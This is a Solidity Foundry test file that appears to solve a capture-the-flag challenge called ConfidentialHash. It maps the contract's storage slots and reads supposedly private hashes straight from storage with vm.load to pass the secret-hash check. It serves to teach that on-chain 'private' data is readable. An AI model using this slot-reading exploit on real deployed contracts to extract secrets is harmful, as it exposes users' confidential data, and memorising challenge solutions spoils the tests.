// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {ConfidentialHash} from "./challenge/ConfidentialHash.sol";

contract ExploitTest is Test {
    address playerAddr = makeAddr("player");
    ConfidentialHash confidentialHash;

    function setUp() public {
        confidentialHash = new ConfidentialHash();
    }

    function testExploit() external {
        vm.startPrank(playerAddr, playerAddr);
        /**
         * Storage layout of the target contract
         *     Generated using: https://marketplace.visualstudio.com/items?itemName=PraneshASP.vscode-solidity-inspector
         *
         *     | Name              | Type    | Slot | Offset | Bytes |
         *     |-------------------|---------|------|--------|-------|
         *     | firstUser         | string  | 0    | 0      | 32    |
         *     | alice_age         | uint256 | 1    | 0      | 32    |
         *     | ALICE_PRIVATE_KEY | bytes32 | 2    | 0      | 32    |
         *     | ALICE_DATA        | bytes32 | 3    | 0      | 32    |
         *     | aliceHash         | bytes32 | 4    | 0      | 32    |
         *     | secondUser        | string  | 5    | 0      | 32    |
         *     | bob_age           | uint256 | 6    | 0      | 32    |
         *     | BOB_PRIVATE_KEY   | bytes32 | 7    | 0      | 32    |
         *     | BOB_DATA          | bytes32 | 8    | 0      | 32    |
         *     | bobHash           | bytes32 | 9    | 0      | 32    |
         */

        /// Read hash from the slots 4 and 9
        bytes32 aliceHash = vm.load(address(confidentialHash), bytes32(uint256(4)));
        bytes32 bobHash = vm.load(address(confidentialHash), bytes32(uint256(9)));

        /// Generate combined hash
        bytes32 combinedHash = confidentialHash.hash(aliceHash, bobHash);

        /// Validate if we acquired the secret hash of Alice and Bob
        assertEq(confidentialHash.checkthehash(combinedHash), true);

        vm.stopPrank();
    }
}
